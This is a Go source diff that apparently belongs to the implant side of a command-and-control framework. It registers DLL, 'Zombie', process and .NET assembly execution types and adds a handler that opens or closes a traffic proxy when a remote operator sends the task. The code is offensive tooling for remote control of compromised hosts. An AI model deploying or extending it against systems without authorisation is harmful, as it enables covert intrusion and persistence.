@@ -19,6 +19,13 @@ import (
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
+var (
+	_ runnable = (*cmd.DLL)(nil)
+	_ runnable = (*cmd.Zombie)(nil)
+	_ runnable = (*cmd.Process)(nil)
+	_ runnable = (*cmd.Assembly)(nil)
+)
+
 func defaultClientMux(s *Session, n *com.Packet) bool {
 	if n.ID < task.MvRefresh {
 		return false
@@ -124,10 +131,7 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 		if err != nil {
 			return true, err
 		}
-		if err := syscall.Chdir(device.Expand(d)); err != nil {
-			return true, err
-		}
-		return true, nil
+		return true, syscall.Chdir(device.Expand(d))
 	case task.MvList:
 		d, err := n.StringVal()
 		if err != nil {
@@ -185,7 +189,43 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 		}
 		return true, nil
 	case task.MvProxy:
-		// TODO(dij): Handle proxy code here.
+		var (
+			v string
+			r bool
+		)
+		if err := n.ReadString(&v); err != nil {
+			return true, err
+		}
+		if err := n.ReadBool(&r); err != nil {
+			return true, err
+		}
+		if r {
+			p := s.GetProxy(v)
+			if p == nil {
+				return true, os.ErrNotExist
+			}
+			return true, p.Close()
+		}
+		if ProfileParser == nil {
+			return true, xerr.Sub("no Profile parser loaded", 0x8)
+		}
+		var (
+			b string
+			k []byte
+		)
+		if err := n.ReadString(&b); err != nil {
+			return true, err
+		}
+		if err := n.ReadBytes(&k); err != nil {
+			return true, err
+		}
+		p, err := ProfileParser(k)
+		if err != nil {
+			return true, xerr.Wrap("parse Profile", err)
+		}
+		if _, err = s.Proxy(v, b, p); err != nil {
+			return true, err
+		}
 		return true, nil
 	case task.MvMounts:
 		m, err := device.Mounts()
